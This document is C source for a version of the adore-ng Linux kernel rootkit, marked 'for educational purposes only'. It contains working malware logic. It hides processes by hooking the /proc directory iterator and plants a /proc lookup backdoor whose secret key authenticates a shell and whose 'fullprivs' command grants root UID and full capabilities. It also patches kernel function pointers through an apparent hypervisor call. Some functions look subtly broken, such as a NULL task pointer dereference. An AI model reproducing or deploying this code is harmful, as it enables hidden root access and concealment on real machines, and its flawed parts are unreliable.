/*** (C) 2004-2005 by Stealth
 *** http://stealth.scorpions.net/rootkits
 *** http://stealth.openwall.net/rootkits
 *** 
 *** 2008 wzt -- Fix gcc complier warnnings.
 ***	
 *** http://www.xsec.org
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 ***/

#define PF_AUTH 0x1000000
#define ADORE_KEY "fgjgggfd"
#define ADORE_VERSION 56

#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#define LINUX26

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/proc_fs.h>
#include <linux/capability.h>
#include <linux/spinlock.h>
#include <linux/pid.h>
#include <linux/init.h>
#include <linux/seq_file.h>
#include <linux/cred.h>

#include <net/sock.h>
#include <net/tcp.h>
#include <linux/un.h>
#include <net/af_unix.h>
#include <linux/aio.h>
#include <linux/list.h>
#include <linux/sysfs.h>
#include <linux/version.h>

/*unsigned orig_cr0; */
/*清除cr0寄存器的写保护位，第16位为WP写保护位*/
/*unsigned clear_return_cr0(void) */
/*{ */
/*	unsigned cr0 = 0; */
/*	unsigned ret; */
/*	asm volatile ("movl %%cr0, %%eax" */
/*	:"=a"(cr0) */
/*	); */
/*	ret = cr0; */
/*	cr0 &= 0xfffeffff; */
/*	asm volatile ("movl %%eax, %%cr0" */
/*	: */
/*	:"a"(cr0) */
/*	); */
/*	return ret; */
/*} */

char *proc_fs = "/proc";	/* default proc FS to hide processes */

typedef int (*readdir_t)(struct file *, void *, filldir_t);
/* readdir_t orig_proc_readdir = NULL; */

typedef int (*iterate_dir_t)(struct file *, struct dir_context *);
iterate_dir_t orig_proc_iterate = NULL;

struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *,
                                   struct nameidata *) = NULL;

#ifndef PID_MAX
#define PID_MAX 0x8000
#endif

static char hidden_procs[PID_MAX/8+1];

inline void hide_proc(pid_t x)
{
	if (x >= PID_MAX || x == 1)
		return;
	hidden_procs[x/8] |= 1<<(x%8);
}

inline void unhide_proc(pid_t x)
{
	if (x >= PID_MAX)
		return;
	hidden_procs[x/8] &= ~(1<<(x%8));
}

inline char is_invisible(pid_t x)
{
	if (x >= PID_MAX)
		return 0;
	return hidden_procs[x/8]&(1<<(x%8));
}

/* Theres some crap after the PID-filename on proc
 * getdents() so the semantics of this function changed:
 * Make "672" -> 672 and
 * "672|@\"   -> 672 too
 */
int adore_atoi(const char *str)
{
	int ret = 0, mul = 1;
	const char *ptr;
   
	for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++) 
		;
	ptr--;
	while (ptr >= str) {
		if (*ptr < '0' || *ptr > '9')
			break;
		ret += (*ptr - '0') * mul;
		mul *= 10;
		ptr--;
	}
	return ret;
}

/* Own implementation of find_task_by_pid() */
struct task_struct *adore_find_task(pid_t pid)
{
    struct task_struct *p;

    rcu_read_lock();
    for_each_process(p) {
        if (p->pid == pid) {
            rcu_read_unlock();
            return 1;
        }
    }
    rcu_read_unlock();
    return 0;
}

int should_be_hidden(pid_t pid)
{
	struct task_struct *p = NULL;

	if (is_invisible(pid)) {
		return 1;
	}

	if(!adore_find_task(pid))
    {
        return 0;
    }

	/* If the parent is hidden, we are hidden too XXX */
	task_lock(p);

	if (is_invisible(p->parent->pid)) {
		task_unlock(p);
		hide_proc(pid);
		return 1;
	}

	task_unlock(p);
	return 0;
}
#ifndef cap_set_full
#ifndef CAP_FULL_SET
# define CAP_FULL_SET     ((kernel_cap_t){{ ~0, ~0 }})
#endif
#ifndef cap_set_full
# define cap_set_full(c)      do { (c) = ((kernel_cap_t){{ ~0, ~0 }}); } while (0)
#endif
#endif

#define PATCH_UID .val

/* You can control adore-ng without ava too:
 *
 * echo > /proc/<ADORE_KEY> will make the shell authenticated,
 * echo > /proc/<ADORE_KEY>-fullprivs will give UID 0,
 * cat /proc/hide-<PID> from such a shell will hide PID,
 * cat /proc/unhide-<PID> will unhide the process
 */
struct dentry *adore_lookup(struct inode *i, struct dentry *d,
                            struct nameidata *nd)
{
	struct cred *edit_cred = (struct cred *)current->cred;
	task_lock(current);

	if (strncmp(ADORE_KEY, d->d_iname, strlen(ADORE_KEY)) == 0) {
		current->flags |= PF_AUTH;
		edit_cred->suid PATCH_UID = ADORE_VERSION;
	} else if ((current->flags & PF_AUTH) &&
		   strncmp(d->d_iname, "fullprivs", 9) == 0) {
		edit_cred->uid PATCH_UID = 0;
		edit_cred->suid PATCH_UID = 0;
		edit_cred->euid PATCH_UID = 0;
	    edit_cred->gid PATCH_UID = 0;
		edit_cred->egid PATCH_UID = 0;
	    edit_cred->fsuid PATCH_UID = 0;
		edit_cred->fsgid PATCH_UID = 0;

		cap_set_full(edit_cred->cap_effective);
		cap_set_full(edit_cred->cap_inheritable);
		cap_set_full(edit_cred->cap_permitted);
	} else if ((current->flags & PF_AUTH) &&
	           strncmp(d->d_iname, "hide-", 5) == 0) {
		hide_proc(adore_atoi(d->d_iname+5));
	} else if ((current->flags & PF_AUTH) &&
	           strncmp(d->d_iname, "unhide-", 7) == 0) {
		unhide_proc(adore_atoi(d->d_iname+7));
	} else if ((current->flags & PF_AUTH) &&
		   strncmp(d->d_iname, "uninstall", 9) == 0) {
		cleanup_module();
	}

	task_unlock(current);

	if (should_be_hidden(adore_atoi(d->d_iname)) &&
	/* A hidden ps must be able to see itself! */
	    !should_be_hidden(current->pid))
		return NULL;

	return orig_proc_lookup(i, d, nd);
}

/* int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir) */
/* { */
/* 	int r = 0; */

/* 	spin_lock(&proc_filldir_lock); */
/* 	proc_filldir = filldir; */
/* 	r = orig_proc_readdir(fp, buf, adore_proc_filldir); */
/* 	spin_unlock(&proc_filldir_lock); */
/* 	return r; */
/* } */

filldir_t orig_proc_filldir = NULL;

DEFINE_SPINLOCK(proc_filldir_lock);

bool adore_proc_filldir(struct dir_context *ctx, const char *name, int nlen, loff_t off, u64 ino, unsigned d_type) {
    char abuf[128];
    if (nlen >= sizeof(abuf))
    {
        nlen = sizeof(abuf) - 1;
    }
    memcpy(abuf, name, nlen);
    abuf[nlen] = '\0';
    if (should_be_hidden(adore_atoi(abuf)))
    {
        return true; // Skip this entry
    }
    // Call the original actor function
    if (orig_proc_filldir)
    {
        return orig_proc_filldir(ctx, name, nlen, off, ino, d_type);
    }
    return true; // Continue reading
}

/* int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x) */
/* { */
/* 	char abuf[128]; */
/* 	memset(abuf, 0, sizeof(abuf)); */
/* 	memcpy(abuf, name, nlen < sizeof(abuf) ? nlen : sizeof(abuf) - 1); */
/* 	if (should_be_hidden(adore_atoi(abuf))) */
/*     { */
/* 		return 0; */
/*     } */
/* 	if (proc_filldir) */
/*     { */
/* 		return proc_filldir(buf, name, nlen, off, ino, x); */
/*     } */
/* 	return 0; */
/* } */

static int adore_proc_iterate(struct file *file, struct dir_context *ctx) {
    int r = 0;
    struct dir_context new_ctx = *ctx; // Copy the original context
    new_ctx.actor = adore_proc_filldir; // Set our custom filldir function
    spin_lock(&proc_filldir_lock);
    orig_proc_filldir = ctx->actor; // Save the original actor
    ctx->actor = new_ctx.actor; // Replace the actor in the original context
    r = iterate_dir(file, ctx); // Call the original iterate function
    ctx->actor = orig_proc_filldir; // Restore the original actor
    spin_unlock(&proc_filldir_lock);

    return r;
}

/* static int adore_proc_iterate(struct file *fp, struct dir_context *ctx) */
/* { */
/* 	int r = 0; */
/* 	struct dir_context new_ctx = { */
/* 		.actor = adore_proc_filldir */
/* 	}; */
/* 	spin_lock(&proc_filldir_lock); */
/* 	proc_filldir = ctx->actor; */
/* 	memcpy(ctx, &new_ctx, sizeof(readdir_t)); */
/* 	r = orig_proc_iterate(fp, ctx); */
/* 	spin_unlock(&proc_filldir_lock); */
/* 	return r; */
/* } */

int patch_vfs(const char *p, 
			iterate_dir_t *orig_iterate, iterate_dir_t new_iterate
			)
{
	struct file_operations *new_op;
	struct file *filep;
	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
        return -1;
	}
	if (orig_iterate)
    {
		*orig_iterate = filep->f_op->iterate;
    }
	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
    /* This is what we'd do if it were so easy */
    /* filep->f_op->iterate = new_iterate; */
    /* But we'll instead use the hypervisor to assign the new value */
    /* Obtain the virtual address of the iterate function pointer */
    void *virtual_address_for_iterate = (void *)&(filep->f_op->iterate);
    /* Translate to physical address (for hypervisor use) */
    phys_addr_t physical_address_for_iterate = virt_to_phys(virtual_address_for_iterate);
    // Hypervisor-specific function to modify the physical memory
    HypervisorAssignPointer(physical_address_for_iterate, (phys_addr_t)new_iterate);




	filp_close(filep, 0);
	return 0;
}

int unpatch_vfs(const char *p, 
				iterate_dir_t orig_iterate
				)
{
    struct file_operations *new_op;
	struct file *filep;
	
    filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
        return -1;
	}

	new_op = (struct file_operations *)filep->f_op;
	printk("unpatch starting, %p --> %p\n", new_op->iterate, orig_iterate);
	new_op->iterate = orig_iterate;
		
	filp_close(filep, 0);
	return 0;
}


int do_adore(void)
{
	struct file_operations *new_op;
	struct inode_operations *new_inode_op;
	int i = 0, j = 0;
	struct file *filep;
	struct list_head *m = NULL, *p = NULL, *n = NULL;
	struct module *me = NULL;
	
	memset(hidden_procs, 0, sizeof(hidden_procs));

    filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) 
		return -1;
	
	/* orig_cr0 = clear_return_cr0(); */

    /* This block is meant to make file access impossible */
	/* new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op; */
	/* orig_proc_lookup = new_inode_op->lookup; */
	/* new_inode_op->lookup = adore_lookup; */

    /* This block is meant to hide files */
    printk("Patching proc VFS\n");
	patch_vfs(proc_fs, &orig_proc_iterate, adore_proc_iterate);
	/* patch_vfs(root_fs, &orig_root_iterate, adore_root_iterate); */
	/* if (opt_fs) */
	/* 	patch_vfs(opt_fs, &orig_opt_iterate, adore_opt_iterate); */
	return 0;
}

